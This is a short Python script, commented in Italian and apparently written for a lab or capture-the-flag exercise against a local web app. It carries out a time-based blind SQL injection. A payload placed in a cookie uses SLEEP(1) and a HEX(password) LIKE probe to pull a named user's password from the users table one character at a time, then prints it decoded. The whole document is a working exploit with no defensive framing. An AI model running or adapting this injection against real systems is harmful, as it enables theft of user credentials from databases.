import requests
from time import time

payload = "foo' and (select SLEEP(1) from users where username = '{}' and HEX(password) LIKE '{}%')='1"
url = 'http://localhost:8080/home.php'

dictionary = '0123456789abcdef'
result = ''

print("Username dell'utente a cui rubare la password: ")
username = input()


while True:
    for c in dictionary:
        # Costruisce la richiesta HTTP
        cookies = {"cookie" : payload.format(username ,result + c)}

        # Memorizza il tempo di inizio
        start_time = time()
        
        # Manda la richiesta
        response = requests.get(url, cookies=cookies)

        # Calcola il tempo trascorso per ottenere la risposta
        elapsed_time = time() - start_time

        # Verifica lo stato della risposta
        if response.status_code == 200:
            
            # Verifica se il tempo trascorso è maggiore di 1
            if(elapsed_time >= 1):
                response = True
            else:
                response = False
        else:
            response = False

        if response == True:  # E' stata trovata una corrispondenza!
            result += c
            print(result)
            break
    else:
        print("La password di " + username +  " è: " + bytes.fromhex(result).decode()) #printa la password
        break 

